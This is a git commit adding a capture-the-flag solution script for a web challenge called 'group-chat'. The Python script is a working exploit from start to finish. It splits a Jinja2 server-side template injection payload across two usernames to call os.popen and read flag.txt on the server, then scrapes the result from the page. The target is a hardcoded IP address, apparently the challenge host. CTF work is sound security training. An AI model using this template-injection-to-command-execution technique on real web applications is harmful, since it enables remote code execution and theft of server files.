71ef3401ef946b62421263aadaf259900538e0a3
S450R1 <s450r1.dz@gmail.com>
2025-08-26 21:56:37 +0100

    Added solution for web group-chat challenge

---
+++ web/group-chat/solution/solve.py
@@ -0,0 +1,47 @@
+
+import sys
+import requests
+from bs4 import BeautifulSoup
+
+message = "dummy"
+
+username1 = "{{cycler.__init__.__globals__.os.popen('cat flag.txt"
+username2 = "'[:12]).read()}}"
+
+usernames = [username1, username2]
+
+base_url = "http://34.44.129.8:55207"
+
+
+def set_username(session, base_url, username):
+    resp = session.post(f"{base_url}/set_username", data={"username": username})
+    print("Username set successfully.")
+
+def send_message(session, base_url, message):
+    resp = session.post(f"{base_url}/send_message", data={"message": message})
+    print("Message sent successfully.")
+
+def get_flag(session, base_url):
+    resp = session.get(f"{base_url}/")
+    soup = BeautifulSoup(resp.text, "html.parser")
+    chat_box = soup.find(id="chat-box")
+    if chat_box:
+        html = chat_box.decode_contents()
+        lines = html.split('<br>')
+        if lines:
+            last = lines[-1].strip()
+            return last.split(':')[0].strip()
+        return None
+    return None
+
+def main():
+    for username in usernames:
+        session = requests.Session()
+        set_username(session, base_url, username)
+        send_message(session, base_url, message)
+        if usernames.index(username) == len(usernames) - 1:
+            chat_box_content = get_flag(session, base_url)
+            print(chat_box_content)
+
+
+main()
